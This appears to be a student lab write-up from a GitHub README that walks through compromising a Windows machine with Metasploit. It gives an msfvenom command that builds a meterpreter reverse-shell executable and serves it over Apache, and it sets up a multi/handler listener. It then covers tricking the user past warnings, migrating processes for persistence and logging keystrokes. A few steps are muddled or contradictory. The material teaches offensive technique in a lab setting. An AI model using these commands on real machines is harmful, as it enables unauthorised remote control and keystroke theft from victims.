# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/bf54dee1-6e34-4aa1-a6f7-b7565b0770ae)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/5b0a4ab1-fe3e-417d-84ee-3cda132b18d0)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/faa49e54-bd9b-451e-90ed-402f60cb5b31)
Start apache server sudo systemctl apache2 start
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/34af7d5b-12ac-440c-9d08-d8a76a966a9d)
Check the status of apache2
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/cd6386a6-5f23-4bc4-b877-c7700518a6e7)
Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/059fd56e-aa41-40c6-97e2-9a25977cd378)
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/0e4758b6-8b39-4934-a5ac-2e360078170d)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/86bf84ad-4d97-46d9-9fa8-b5ad97a89299)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/9e863604-6de9-4650-9d28-2ba904ab32e6)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/f8805be5-b35b-4a2f-9197-5d82b9ba2b9f)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/sakthipriyadhanusu/Compromising-windows-using-Metasploit/assets/119393194/211ade5b-c1f4-4154-80a7-05f4185748da)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
